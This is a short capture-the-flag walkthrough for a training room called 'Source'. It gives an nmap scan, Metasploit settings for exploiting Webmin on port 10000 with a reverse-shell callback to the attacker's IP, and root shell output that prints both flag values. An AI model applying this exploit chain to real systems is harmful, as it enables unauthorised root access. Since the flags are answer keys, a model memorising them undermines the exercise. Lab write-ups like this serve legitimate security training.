**CTF Room name:** Source 

Starting the challenge with `active reconnaisance` first  ->

```bash 
nmap -sC -sV -O -p- <target_ip>
```
Found two open port 

```bash 
ssh 22
http 10000 webmin
```
Run metasploit and search for the vulnerability that have been exploited

```bash 
msfconsole 

search type:exploit platform:linux name:webmin
set RHOSTS <target_ip> 
set LHOST <your_tunl_ip> 
set URIPATH /session_login.cgi
set SSL true
```


FLAG 1:
```bash
root@source:~# cat /home/dark/user.txt
cat /home/dark/user.txt
Flag: THM{SUPPLY_CHAIN_COMPROMISE}
```

FLAG 2: 
```bash
root@source:~# cat root.txt
cat root.txt
Flag: THM{UPDATE_YOUR_INSTALL}
```
